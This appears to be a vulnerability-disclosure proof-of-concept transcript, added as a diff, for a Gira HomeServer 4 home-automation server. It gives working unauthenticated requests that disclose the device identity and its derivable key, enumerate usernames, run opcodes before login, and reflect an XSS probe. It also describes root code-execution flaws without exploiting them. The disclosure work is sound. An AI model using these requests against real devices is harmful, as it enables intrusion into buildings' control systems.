@@ -1,0 +1,74 @@
+Gira HomeServer 4 - vulnerability verification PoC
+Target : <hs4-ip>:80
+When   : <iso-timestamp>
+Mode   : READ-ONLY / NON-ACTUATING. No writes, no shell, no firmware.
+
+========================================================================
+Finding D - unauthenticated identity disclosure (/HSADMIN?CMD=INIT)
+========================================================================
+Request : GET /HSADMIN?CMD=INIT&USER=admin   (no credentials)
+Response:
+  <HS tan="<tan>">
+  <HND>9999</HND>
+  <KEY><md5 of serial, hex></KEY>
+  <SNO><serial></SNO>
+  </HS>
+
+Proof   : KEY == md5(lower(SNO)+upper(SNO)) ?  YES
+          -> the 'key' is derived from the serial, which is returned
+             in the same response and is the device MAC. Not a secret.
+VERDICT : CONFIRMED - identity + handle issued with no authentication.
+
+========================================================================
+Finding B - username enumeration oracle
+========================================================================
+QUAD  user=admin      -> salt '<salt>'
+QUAD  user=zzqqnope   -> salt ''
+HSADMIN user=admin      -> 114-byte body
+HSADMIN user=zzqqnope   -> 0-byte body
+VERDICT : CONFIRMED - known and unknown users are distinguishable.
+
+========================================================================
+Finding A - application opcode dispatched before authentication
+========================================================================
+Method  : send a username, then opcode 99 (ping) with NO password.
+          99 is non-actuating; the actuating opcodes (1/2/20/21/12/13)
+          share the same unguarded dispatch in hs_client.checkNewData().
+  RX 100||
+  TX 90|admin|   (username only)
+  RX 91|<salt>|
+  TX 99||     (ping - NO password sent)
+  RX 99||
+VERDICT : CONFIRMED - opcode processed while status < 2 (no password given).
+
+========================================================================
+Finding C - unauthenticated reflected XSS in /hshtm
+========================================================================
+Request : GET /hshtm?user=POCqq%22%3E%3CPOCTAG%3E&pw=POCpw
+Reflected unescaped: YES
+  <html><body><form name="hs" action="hshtm" method="get"><table cellpadding="5"><tr><td></td><td><b>Anmeldung</b></td></tr><tr><td>Benutzername:</td><td><input n
+VERDICT : CONFIRMED - attribute context broken by unescaped input.
+
+========================================================================
+Findings E and F - code execution (REPORTED, NOT EXPLOITED HERE)
+========================================================================
+E  Unsigned firmware write + path traversal in hs_load.CLoad.putFirm().
+   Reachable when isSnowport() is true, i.e. /proc/partitions reports 'sda'
+   (SATA units). This PoC does not flash firmware. See REPORT.md section E
+   for the decompiled validation code (names-in-INHALT.TXT only; md5.chk
+   never consulted) and the unsanitised open('/fw/'+filename).
+
+F  hs_logik.addFormel()/calc() compile() and eval() project-supplied
+   expressions inside a process running as root. Project-load permission is
+   therefore equivalent to root. This PoC does not inject a formula. See
+   REPORT.md section F for the decompiled compile()/eval() excerpt.
+
+Both are demonstrable with the admin password on this hardware; they are
+omitted from the automated run to keep this attachment non-destructive.
+
+========================================================================
+END
+========================================================================
+Note: this transcript is read-only evidence. Nothing on the target was
+modified by running it.
+SHA-256(transcript) = fa9517d6bb8a31b1536a26619c64259759f788491b78fe83fc2eec3c43afd1d8
